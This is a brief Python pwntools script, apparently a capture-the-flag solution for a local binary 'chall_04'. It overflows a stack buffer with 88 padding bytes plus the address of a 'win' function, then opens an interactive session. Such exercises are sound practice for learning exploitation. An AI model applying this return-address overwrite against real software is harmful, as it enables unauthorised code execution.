from pwn import *
#loading the binary and crafting the excution
elf = ELF("./chall_04")
execution = b's'*88+p64(elf.sym.win)
#start the process
r=process("./chall_04")
r.sendline(execution)
r.interactive()
r.close()
